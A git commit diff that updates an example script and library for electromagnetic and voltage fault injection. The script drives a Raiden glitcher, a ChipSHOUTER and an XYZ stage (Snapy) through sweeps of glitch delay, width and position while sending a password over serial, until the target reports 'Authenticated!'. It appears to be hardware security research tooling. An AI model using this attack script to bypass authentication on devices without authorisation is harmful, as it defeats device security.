9a20af903fabe30af628ffb798ccabc8148eabc4
h0rac <horac26@gmail.com>
2022-10-15 13:13:52 +0200

    update library

--- examples/snapy_test.py
+++ examples/snapy_test.py
@@ -3,61 +3,140 @@ from snapy import snapy
 import pandas as pd
 import matplotlib.pyplot as plt
 from raiden_python import raiden 
+from chipshouter import ChipSHOUTER
 import time
-raiden = raiden.Raiden(mhz=200, serial_dev="/dev/tty.usbserial-210319A279441", baud= 115200, ticks= True, debug=True) 
+import sys
+import serial
+
+raiden = raiden.Raiden(mhz=200, serial_dev="/dev/dev_raiden", baud= 115200, ticks= True) 
+snapy = snapy.Snapy(x =5, y=5, offset=1, jog=500)
+device = serial.Serial("/dev/dev_serial_logitech", baudrate= 115200, timeout=0.03)
+
+cs = ChipSHOUTER("/dev/dev_chipshouter")
 
 
-snapy = snapy.Snapy(x =9, y=10, offset=1, jog=500, sleep=0.4)
+cs.voltage = 380
+cs.armed - 0
+cs.armed = 1
+cs.absent_temp = 60
 
-curr_pos = snapy.get_current_pos()
-print("[+] Current position: {}".format(curr_pos))
+def send_passw():
+    glitch_status = 0
+    data = b""
+    try:
+      device.flush()
+      device.write(b"\n")
+      line = device.read_until(expected=b"password:")
+      device.write(b"t\n")
+      data = device.read(20)
+    except Exception:
+      pass
+    if b"Authenticated!" in data and len(data) >2:
+      print("Success! ", data)
+      glitch_status = 1
+    else:
+      print(data)
+      glitch_status = 0
+    return glitch_status
 
+def reset_device():
+    raiden.set_param('CMD_GPIO_OUT', value=0)
+    raiden.set_param('CMD_GPIO_OUT', value=1)
+
+print ("ID", cs.id)
 raiden.reset_glitcher()
 raiden.arm(0)
+
 
 print(raiden.get_buildtime())
 raiden.set_param(param="CMD_VSTART", value=1)
 raiden.set_param(param="CMD_GLITCH_MAX", value= 1)
 
-raiden.set_target_power("off")
-time.sleep(1)
-raiden.set_target_power("on")
-time.sleep(1)
-
 x = 0
 y = 0
+cnt = 0
+width = 0
+width_max = 15
+delay_max = 146015
+try_num = 0
+try_num_max = 6
 
 pos = None
+fwd = True
 
-while y < snapy.get_y_max_steps():
-    x = 0
-    pos = self.get_current_pos()
-    snapy.record(pos)
-    while x < snapy.get_x_max_steps():     
-      x += 1
-      raiden.set_target_power("auto")
-      raiden.arm(0)  
-      raiden.reset_glitcher()     
-      raiden.set_param(param="CMD_GLITCH_DELAY", value= 0)
-      raiden.set_param(param="CMD_GLITCH_WIDTH", value= 800)
-      raiden.set_param(param="CMD_GLITCH_GAP", value= 5)
-      raiden.set_param(param="CMD_GLITCH_COUNT", value= 1)
-      raiden.set_param(param="CMD_UART_TRIGGER", value= 0x64)
-      raiden.set_param(param="CMD_UART_TRIGGER_BAUD", value=0x1c200)
-      raiden.arm(1)
-      snapy.step(fwd=True, x=True)
-      while not raiden.is_finished():
-          pass
-    y +=1
-    snapy.step(fwd=False, x=False)
-    print("glitch cycle done")
+status = 0
 
-pos = snapy.get_current_pos()
-print("[+] End position: {}".format(pos))
-snapy.go_start_position(pos, curr_pos)
+start_pos = snapy.get_current_pos()
+print("[+] Current position: {}".format(start_pos))
 
-read_file = pd.read_csv (r'coords.csv')
-read_file.to_excel (r'coords-test.xlsx', index = None, header=True)
+try:
+  time.sleep(1)
+  while True:
+    delay = 146000
+    while delay <= delay_max:
+      width = 11
+      y = 0
+      fwd = True
+      while width <= width_max:
+        while y < snapy.get_y_max_steps():
+          x = 0
+          pos = snapy.get_current_pos()
+          snapy.record(pos)
+          while x < snapy.get_x_max_steps():
+            try_num = 0 
+            while try_num <= try_num_max:
+              print("width: {}, delay: {}, tries: {}".format(width, delay, try_num)) 
+              raiden.set_target_power("auto")
+              raiden.arm(0)  
+              raiden.reset_glitcher()     
+              raiden.set_param(param="CMD_GLITCH_DELAY", value= delay)
+              raiden.set_param(param="CMD_GLITCH_WIDTH", value= width)
+              raiden.set_param(param="CMD_GLITCH_GAP", value= 450)
+              raiden.set_param(param="CMD_GLITCH_COUNT", value= 1)
+              raiden.set_param(param="CMD_UART_TRIGGER", value= 0xA)
+              raiden.set_param(param="CMD_UART_TRIGGER_BAUD", value=115200)
+              raiden.arm(1)
 
-snapy.device.close()
-snapy.f.close()
+              status = send_passw()
+              
+              while not raiden.is_finished():
+                  pass
+
+              if status:
+                print("GOT IT !!! => width: {}, delay: {}".format(width, delay))
+                raiden.arm(0)
+                end_pos = snapy.get_current_pos()
+                print("[+] Start position: {}".format(start_pos))
+                print("[+] End position: {}".format(end_pos))
+                cs.armed = 0
+                snapy.go_selected_position(curr_pos = end_pos, last_pos =start_pos)
+                sys.exit(0)
+
+
+              reset_device()
+              print(cnt)      
+              print("[+] Glitch cycle completed")
+              cnt += 1
+              try_num += 1
+            x += 1 
+            snapy.step(fwd=fwd, axis_x=True, x=x, y=y, status=status)
+          y +=1
+          fwd = not fwd
+          snapy.step(fwd=fwd, axis_x=False, x=x, y=y, status=status)
+          end_pos = snapy.get_current_pos()
+        width = width + 1
+      delay = delay +1
+      print("[+] Start position: {}".format(start_pos))
+      print("[+] End position: {}".format(end_pos))
+      snapy.go_selected_position(curr_pos = end_pos, last_pos =start_pos)
+
+except KeyboardInterrupt:
+    print("Killing raiden...")
+    cs.armed = 0
+    end_pos = snapy.get_current_pos()
+    print("[+] Start position: {}".format(start_pos))
+    print("[+] End position: {}".format(end_pos))
+    snapy.go_selected_position(curr_pos = end_pos, last_pos =start_pos)
+    snapy.f.close()
+    snapy.device.close()
+    raiden.arm(0)
--- snapy/snapy.py
+++ snapy/snapy.py
@@ -1,9 +1,10 @@
 import serial
 import time
 import csv
+import sys
 
 class Snapy:
-  def __init__(self, baud= 115200, dev="/dev/tty.usbserial-14220", x=None, y=None, z=None, offset=None, move=None, jog=200, sleep=0.5):
+  def __init__(self, baud= 115200, dev="/dev/dev_snapy_xyz", x=None, y=None, z=None, offset=None, move=None, jog=200):
     self.baud = baud
     self.device = serial.Serial(dev, baudrate= baud, timeout=3.5, writeTimeout=2.5)
     self.jog_speeds = [3000, 1500, 500, 200]
@@ -19,37 +20,37 @@ class Snapy:
     self.steps = None
     self.max_step_x = None
     self.max_step_y = None
-    self.sleep = sleep    
     self.f = open('coords.csv', 'w')
     self.writer = csv.writer(self.f)
-    headers = ['X', 'Y', 'Z']
+    headers = ['X', 'Y', 'Z', 'RESULT']
     self.writer.writerow(headers)
 
 
   def _send_gcode_cmd(self, cmd):
-    print(cmd)
+    # print(cmd)
     self.device.write(b"G91\n")    
     resp =  self.device.read_until(b'ok')
-    print(resp)
+    # print(resp)
     if b'ok' in resp:
-      print(cmd)
+      # print(cmd)
       resp = self.device.write(cmd+b"\n")
       resp =  self.device.read_until(b'ok')
-      print(resp)
+      # print(resp)
       if b'ok' in resp:
          cmd = b"G90"
-         print(cmd)
+         # print(cmd)
          resp = self.device.write(cmd+b"\n")
          resp =  self.device.read_until(b'ok')
-         print(resp)
-         if b'ok' in resp:
-            time.sleep(self.sleep)
+         # print(resp)
+         if not b'ok' in resp:
+            print("[-] error on gcode command")
+            sys.exit(1)
 
   def _send_marlin_cmd(self,cmd):   
-    print("cmd", cmd)
+    # print("cmd", cmd)
     self.device.write(cmd+b"\n")
     raw =  self.device.read_until(b'ok')
-    print("raw", raw)
+    # print("raw", raw)
     if b'ok' in raw:  
       return raw
 
@@ -79,7 +80,7 @@ class Snapy:
     temp = {k:float(v) for k,v in temp.items()}
     return temp
 
-  def go_start_position(self, curr_pos=None, last_pos=None):
+  def go_selected_position(self, curr_pos=None, last_pos=None):
     x =  curr_pos.get('X') - last_pos.get('X')
     y =  curr_pos.get('Y') - last_pos.get('Y')
     z =  curr_pos.get('Z') - last_pos.get('Z')
@@ -94,11 +95,13 @@ class Snapy:
   def get_y_max_steps(self):
     return self._xy_max_steps()[1]
 
-  def record(self, pos):
+  def record(self, pos, status=0):
+    pos["status"] = status
+    print(pos)
     self.writer.writerow(pos.values())
 
 
-  def step(self, z=None, x=None, y=None, fwd=None, axis_x=None):
+  def step(self, z=None, x=None, y=None, fwd=None, axis_x=None, status=0):
     if not self.jog in self.jog_speeds:
       print("[-] Unsupported jog speed, please select {}".format(self.jog_speeds))
       return -1
@@ -111,15 +114,11 @@ class Snapy:
     if axis_x:
       cmd = "G0 X{}{} F{}".format(sign, self.offset, self.jog).encode()
       self._send_gcode_cmd(cmd) 
-      print("[+] {} steps executed on X axis".format(x))
       pos = self.get_current_pos()
-      self.record(pos)
-    # fwd = not fwd
+      self.record(pos, status=status) 
     else:
-      print("[+] {} steps executed on Y axis".format(y))
       cmd = "G0 Y{} F{}".format(self.offset, self.jog).encode()
-      self._send_gcode_cmd(cmd)
-    return self.get_current_pos()
+      self._send_gcode_cmd(cmd)  
 
   def home(self):
     self._send_gcode_cmd(b"G53")
